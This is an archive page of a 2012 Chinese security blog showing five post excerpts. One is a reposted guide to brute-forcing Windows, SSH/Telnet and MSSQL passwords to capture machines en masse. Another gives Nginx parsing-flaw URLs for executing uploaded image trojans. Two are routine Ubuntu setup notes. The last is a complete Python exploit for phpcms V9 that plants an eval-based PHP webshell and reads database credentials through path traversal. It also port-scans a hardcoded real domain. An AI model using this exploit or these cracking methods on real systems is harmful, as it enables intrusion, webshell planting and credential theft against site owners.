<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>第 3 页 | 归档 | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2014 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<h2 class="archive-title">归档</h2>


  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-09-07-渗透之密码破解.html">渗透之密码破解</a></h1>
  

      <time datetime="2012-09-06T17:38:09.000Z"><a href="/html/2012-09-07-渗透之密码破解.html">9月 7 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>本文转自：法客 作者：杀猪刀</p>
<p>习惯了，睡觉去法客看看有没有好的文章看看，今天发现这个文章相当不错，所以转载之~~</p>
<h1 id="-">一、系统密码破解篇：</h1>
<p>1） Windows系统密码破解</p>
<p>说起系统密码，估计玩安全比较早的人都知道04-07年那一阵一个啊D工具包就能够扫出一大堆肉鸡，
但是对于牛逼的XX们来说这显然是不够用的，于是慢慢到后来就有了各种XX论坛、XX小组自动抓鸡工具，后来360的崛起，
免费的杀软如春笋般冒出才慢慢止住势头，那么对于Windows系统账号密码破解，工具很多，主流的有：
啊D网络工具包
NTScan
Windows系统密码破解的流程是：</p>
<ol>
<li>通过扫描端口确定对方开启了IPC$</li>
<li>通过工具穷举密码直到正确的密码</li>
<li>获得正确的密码后通过远程任务计划开启进程等（最原始最土的做法）很明显这种方法一般是作为菜鸟入门才使用的，记得当时分析自动抓鸡才发现，使用了WMIC管理规范，原来是一段WMIC脚本自动HTTP种植木马，到目前为止所谓自动化135抓鸡工具也是此原理和代码；</li>
</ol>
<p>近年来还流行一种所谓RDP远程破解抓肉鸡的方法，原理很简单模拟批量登入RDP协议（Remote Desktop Protocol），
很简单有过Windows管理经验的人都知道微软默认的管理方式就是RDP远程桌面管理，很明显如果可以模拟此行为大量提交那么也可以破解密码，
代表的工具就是俄罗斯黑客出品的public版工具以及XXX。其实还有一种方式不通过微软RDP端，自己重写RDP连接协议，效率更高。此类工具我就用过，嘿嘿。</p>
<p>本地破解：
通过抓hash然后字典破解，这种方法适合已经获取系统权限可以抓密码文件的方式，所以叫做本地破解，
也许本人小时候帮助舅舅杀猪的时候按猪脚沾了血腥，导致这些年运气不好，成功率不到1/1000。</p>
<p>总结：</p>
<blockquote>
<p>到目前为止，一些地下组织的所谓全端口抓鸡工具包也包含了Windows系统密码破解的，Windows 2000/xp/2003/vista/win7都通用，
如果各位有疑问可以扫你们当地网段肯定可以扫到包含弱口令的机器，如果运气好那就直接可以上传执行木马。当然对于我们搞Web安全来说，
经常遇到需要破解密码的情况无非是提权抓到了本地密码文件，然后爆破密码。还有就是日进了内网，扩展战果使用，都非常重要，而且屡试不爽。</p>
</blockquote>
<p>2） Linux/Unix系统密码破解：</p>
<p>Linux/Unix目前主流的管理协议都是SSH/Telnet，常用的管理工具诸如：Putty、SecureCRT、SSHClient等，
目前因为Linux/Unix入门相对Windows较难，因此玩Linux/Unix的人比较少，相对的流行的工具、教程也少。
那么Linux/Unix可不可以像Windows那样批量扫肉鸡，当然是可以了。先说Telnet协议，大家都知道Telnet是明文协议，
也就是可以抓包获取登入密码，而一般的网络设备如交换机、路由器、防火墙默认基本上都是通过Telnet协议远程管理，
要破解Telnet协议密码也非常简单，工具很多比如X-Scan等，而SSH协议也类似，直接破解密码后使用工具也可以直接登入。
而且登入后直接执行命令，而不必像windows那样需要种植木马后门才能够交互执行。如果有想学习路由交换而缺少银子的朋友，
建议你操起X-Scan填入你们当地公网网段，破telnet/ssh你会发现大量的H3COM、中兴等你蹂躏。搞完考一个CCNA肯定没问题；
总结：Linux/Unix破解密码的先决条件是目标采用静态密码验证登入系统，如果采用的是RSA密钥的方式验证，那么这类基于远程密码破解自然就无意义了。
这也是与Windows区别比较大的地方。另外破解Linux/Unix密码也可以采用曲线救国的方式，那就是知道对方采用某一类管理工具比如VNC等X-Windows客户端软件。
这类工具很多都有自己的验证方式，如果爆发漏洞（比如之前的VNC弱口令），或者没有采用强壮的认证方式那么更加容易被远程暴力破解。
这种情况通常发生在有一定规模的企业，服务器达到一定的数量级为了便于管理通常都会使用某一类商用管理客户端。
当然，目的是密码，也可以剑走偏锋。比如今年爆发的汉化版客户端Putty、SecureCRT等被植入后门的事件也充分说明了广大“黑客”的智慧无上限。
代表工具：单一协议很多，这里推荐神器：Hydra以及NCrack。详见<a href="http://sectools.org/。" target="_blank">http://sectools.org/。</a></p>
<h1 id="-">二、数据库密码篇：</h1>
<p>主流的数据库很多，目前国内流行的基于破解密码的抓鸡方式最主流的就是1433抓鸡，之所以叫1433抓鸡是因为微软MSSQL Server数据库默认远程管理端口是1433（当然可以更改），
而默认情况下MSSQL Server最高权限用户sa绑定了shell，通俗的说就是如果你拥有了MSSQL Server 数据库Sa账户的权限那么你就拥有了系统执行权限。
所以随便谷歌1433抓鸡|1433批量抓鸡，工具教程一大把。利用的程序也就那么几个因为够代表性简述下大概流程：</p>
<ol>
<li>通过端口批量扫描确定开放1433的主机，一般这个扫描由S扫描器完成，也就是Wineggdrop大神的S扫描器，在此感谢他提供了互联网历史上公开最快的SYN扫描工具，没有之一。</li>
<li>通过管理工具连接存在弱口令的主机，通常使用小榕写的MSSQL执行工具；</li>
<li>如果发现没有权限那么导入一堆的恢复扩展命令，直到能恢复为止；</li>
<li>确定能够执行的工具后上传木马，于是肉鸡到手；</li>
</ol>
<p>PS：这个是目前为止除了挂马来肉鸡最快的远程抓鸡方式，说到这里或许有人会问，Access数据库行不行，能不能破解弱口令抓肉鸡？
没意义，因为Access是非常小型本地数据库，适用于小应用，微软没有为其提供远程管理方式，所以就没远程破解密码的说法，
对于web安全而言更多的是通过注入、路径泄漏等方式获取Access数据库中的管理员密码然后登入后台获取Webshell，然后提权。
当然MSSQL数据库密码获取也可以剑走偏锋，比如获取Webshell之后通过翻看配置文件，
通常关于数据库信息容易存在于conn.asp、webconfig.xml等默认配置文件以及用户自行开发的配置文件中。
国内也有商用工具在做白盒测试扫描时会自动遍历此类文件然后做关键是识别匹配。</p>
<p>说完MSSQL那就不不说跟他很像的MySQL数据库，这个数据库通常运行于Linux/Unix系统中。MYSQL与其功能强大、免费、高效著称。
很明显作为一款强大的数据库必须支持远程管理，那么自然就有破解密码这一说了，通常情况下纯粹远程破解MYSQL可以使用的工具很多比如国产的X-Scan、HScan等。
当然也可以通过爆破phpMyadmin这个管理平台来曲线救国达到爆破的目的，区别在于用HTTP通道爆破而已。以上为比较典型的远程破解，
而本地破解则显得比较单一，通过webshell或者提权之后获取user.MYD文件（此文件Linux与Windows都存放在相同目录）
然后找到Hash本地爆破或者使用网站在线爆破比如：<a href="http://www.onlinehashcrack.com/multi-hash-cracking.php。" target="_blank">http://www.onlinehashcrack.com/multi-hash-cracking.php。</a>
当然了MYSQL同样可以使用查看网站配置文件的方式获取密码，比如各种CMS以及论坛，初次安装都需要写入数据库连接信息到某配置文件xx .inc.php等。
当然不管何种数据库都会有漏洞爆发的可能，导致验证被攻破，比如前一段时间爆发的MySQL身份认证漏洞。导致直接可以绕过认证。</p>
<p>一篇不错的文章，所以收留之~</p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 9月 7 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-29-nginx解析漏洞原理及其利用方法.html">Nginx解析漏洞原理及其利用方法</a></h1>
  

      <time datetime="2012-08-28T19:08:09.000Z"><a href="/html/2012-08-29-nginx解析漏洞原理及其利用方法.html">8月 29 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>Nginx解析漏洞已经是比较老的漏洞了，但是互联网上还有不少使用存在解析漏洞的nginx版本。</p>
<p>很久没写文章了，睡觉去去法客转了圈看到一片nginx漏洞的渗透文章，才发现自己似乎也没写过。</p>
<p>nginx解析漏洞是由于nginx部分版本程序本身的漏洞导致解析非可以执行脚本程序如PHP.</p>
<p>如下面两个假设在存在漏洞的站点上有一张图片url地址为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>www<span class="preprocessor">.creturn</span><span class="preprocessor">.com</span>/logo<span class="preprocessor">.jpg</span>   //假设存在这个图片
</pre></td></tr></table></figure>

<p>而当我们正常访问，nginx会把这个当作非脚本语言直接读取传送会客户端（也就是浏览器），但是</p>
<p>存在解析漏洞的nginx会把如下连接解析并且执行~：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre>www<span class="preprocessor">.creturn</span><span class="preprocessor">.com</span>/logo<span class="preprocessor">.jpg</span>/a<span class="preprocessor">.php</span>  （老的解析方式）这样写的话nginx会把logo<span class="preprocessor">.jpg</span>当作脚本解析执行后再输出
www<span class="preprocessor">.creturn</span><span class="preprocessor">.com</span>/logo<span class="preprocessor">.jpg</span>%<span class="number">00.</span>php //这个是<span class="number">7</span>月中旬爆出的解析漏洞
</pre></td></tr></table></figure>

<p>这样的解析漏洞有什么危害？其实很多站的安全或者程序样做的比较严谨的话，就没办法直接拿下，但是很多社交类</p>
<p>或者交互类的站点上往往允许用户上传图片，如社交网站一般都会允许上传头像~这样如果有心人传送一个图马上去就可以直接解析了。</p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-29-nginx解析漏洞原理及其利用方法.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-15-ubuntu下eclipseerlangmongodb开发环境搭建.html">ubuntu下eclipse+erlang+mongodb开发环境搭建</a></h1>
  

      <time datetime="2012-08-15T15:56:28.000Z"><a href="/html/2012-08-15-ubuntu下eclipseerlangmongodb开发环境搭建.html">8月 15 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>最近公司webGame项目中用到了Erlang+MongoDB，没办法项目需要那就学呗。</p>
<p>学这个东西最起码得有环境吧，今天搭建开发环境就顺便记录一下，依然在ubuntu下进行开发。</p>
<p>顺便说下，如果做开发，最好选择linux，因为很多环境在linux下搭建很方便。win下一般也会</p>
<p>有相应的发法搭建，但是经常会遇到一些莫名其妙的问题。因此建议做开发的同学还是Linux下吧。</p>
<p>好了不废话了，继续我们的环境搭建（Ubuntu下进行）：</p>
<p>Mongodb 安装</p>
<p>打开命令输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="built_in">sudo</span> apt-get install mongodb
</pre></td></tr></table></figure>

<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-15-ubuntu下eclipseerlangmongodb开发环境搭建.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-13-ubuntu下都php开发环境架设.html">Ubuntu下的PHP开发环境架设</a></h1>
  

      <time datetime="2012-08-13T14:56:07.000Z"><a href="/html/2012-08-13-ubuntu下都php开发环境架设.html">8月 13 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>今天重新装了ubuntu那么就吧过程记录下。</p>
<p>打开终端，也就是命令提示符。</p>
<p>我们先来最小化组建安装，按照自己的需求一步一步装其他扩展。命令提示符输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>sudo apt<span class="attribute">-get</span> install apache2 php5<span class="attribute">-mysql</span> libapache2<span class="attribute">-mod</span><span class="attribute">-php5</span> mysql<span class="attribute">-server</span>
</pre></td></tr></table></figure>

<p>上面的命令是最小化组建安装amp也就是apache2 ,php5 和 mysql 在加上一个php的mysql扩展</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png" alt="" title="2012-08-14 00:23:50的屏幕截图"></a>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-13-ubuntu下都php开发环境架设.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html">Python版 phpcmsV9自动写shell工具</a></h1>
  

      <time datetime="2012-08-07T17:21:18.000Z"><a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html">8月 8 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>最近一直在学习python相关内容就顺手写个工具以作练习，上代码：</p>
<blockquote>
<p>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
</pre></td><td class="code"><pre>#coding: GBK
'''
Created on 2012-8-2

@author: Return
'''
import cookielib
import urllib2,urllib
import re
import sys
import os
import socket
class getShell:

    rhost = ''                                  #远程目标主机
    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置
    codeSavePath    = 'tmp/code/code.png'       #code    保存位置
    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话
    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
    tmpPath         = ''    #临时地址存贮变量
    dataBaseInfo    = {}    #数据库信息
    postData        = {}    #post数据
    url             = ''    #远程url地址
    username        = ''    #用户名
    password        = ''    #用户密码
    vfCode          = ''    #验证码
    pc_hash         = ''    #phpcmsV9校验值
    result          = ''    #临时变量
    #==============================================================
    # __init__    初始化函数
    #==============================================================
    def __init__(self):
        self.cookie = cookielib.LWPCookieJar()
        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))
    #==============================================================
    # login    登录
    #==============================================================
    def login(self):
        self.getVerifyCode()    #先获取验证码
        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'
        self.postData = {
             'username':self.username,
             'password':self.password,
             'code':self.vfCode,
             'dosubmit':''
            }
        self.url = 'http://'+self.rhost+self.tmpPath
        self.result = self.urlPostData()

        if len(re.findall(&quot;登录成功&quot;,self.result)):
            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()
            print '登录成功'
            self.wirteShell() # 登陆成功后写入shell
        else:
            print '登录失败'
            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)
            self.login()
    def wirteShell(self):
        print '写入Shell...'
        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='
        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过
        self.result = self.urlPostData()
        if len(re.findall('点击插入',self.result)):
            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)
            #提交写shell模版
            self.postData = {
                    'code':self.phpShell,
                    'dosubmit':'提交',
                    'pc_hash':self.pc_hash
                }
            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
            self.urlPostData()
            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell
            #写回原模版
            self.postData = {
                    'code':templateTmp,
                    'dosubmit':'提交',
                    'pc_hash':self.pc_hash
                }
            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
            self.urlPostData()
        else:
            print '没有找到Search的foot模版...'
    #==============================================================
    # getVerifyCode    获取验证码
    #==============================================================
    def getVerifyCode(self):
        #验证码获取地址
        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='
        self.url = 'http://'+self.rhost+self.tmpPath
        open(self.codeSavePath,'wb').write(self.urlPostData())
        print '请输入验证码:'
        self.showPic()
        self.vfCode = sys.stdin.readline()

    #==============================================================
    # urlPostData    url Post提交数据
    #==============================================================
    def urlPostData(self):
        postData = urllib.urlencode(self.postData)
        req = urllib2.Request(
                          url = self.url,
                          data = postData,
                          headers = self.header
                          )
        result = urllib2.urlopen(req).read()
        self.saveCookie()
        self.delVariable()
        return result

    #==============================================================
    # getDataBaseInfo    获取数据库信息
    #==============================================================
    def getDataBaseInfo(self):
        #爆数据库信息地址
        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'
        self.url = 'http://'+self.rhost+self.tmpPath
        result = self.urlPostData()
        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()
    #==============================================================
    # printDbInfo    输出数据库信息
    #==============================================================
    def printDbInfo(self):
        print 'HostName:',self.dataBaseInfo['hostName']
        print 'DataBase:',self.dataBaseInfo['database']
        print 'UserName:',self.dataBaseInfo['username']
        print 'Password:',self.dataBaseInfo['password']
        print 'TablePre:',self.dataBaseInfo['tablepre']
        print 'DataType:',self.dataBaseInfo['type']
    #==============================================================
    # scanPort    端口扫描
    #==============================================================
    def scanPort(self):
        for p in range(80,8000):
            try:
                ip = 'www.gidigame.com'
                port = p
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((ip,port))
                print 'Port:',port,' open'
                s.close()
            except socket.error,msg:
                pass
                #print 'Port:',port,' close'
    #==============================================================
    # setRhost    设置目标主机
    #==============================================================
    def setRhost(self,host):
        self.rhost = host
    #==============================================================
    # getRhost    获取目标主机
    #==============================================================
    def getRhost(self):
        return self.rhost
    #==============================================================
    # setShell    自定义shell
    #==============================================================
    def setShell(self,shellCode):
        self.phpShell = shellCode
    #==============================================================
    # saveCookie    保存cookie值
    #==============================================================
    def saveCookie(self):
        self.cookie.save(self.cookieSavePath)
    #==============================================================
    # logMsg    日志信息，这里可以自己捕捉异常后处理信息
    #==============================================================
    def logMsg(self,msg):
        print msg
        exit()
    #==============================================================
    # showPic    用来显示验证码
    #==============================================================
    def showPic(self):
        imgPath = os.path.abspath(self.codeSavePath)
        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)
    #==============================================================
    # delVariable    清除变量，防止产生误差
    #==============================================================
    def delVariable(self):
        self.url            = ''
        self.tmpPath        = ''
        self.dataBaseInfo   = {}
        self.postData       = {}
        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
    #==============================================================
    # __del__    析构函数，类被注销时候调用
    #==============================================================
    def __del__(self):
        print 'Bye...'
def sysinfo():
    print '''
********************************************************************************
PHPcmsV9 自动写shell

功能：自动写入caches目录下cmd.php一句话 密码:cmd

Author: Return    Blog:www.creturn.com

Example: exp.py www.creutn.com username password
********************************************************************************
'''
#================================================================
# main    入口函数
#================================================================
def main():
    sysinfo();
    shell = getShell()
    if(len(sys.argv) &gt; 3):
        shell.setRhost(sys.argv[1])
        shell.username = sys.argv[2]
        shell.password = sys.argv[3]
	shell.login()
    else:
        print '参数不对！'

if __name__ == '__main__':
    main()
</pre></td></tr></table></figure>


      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  

  <nav id="pagination">
  
    <a href="/archives/page/2/" class="alignleft prev">上一页</a>
  
  
    <a href="/archives/page/4/" class="alignright next">下一页</a>
  
</nav>
</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>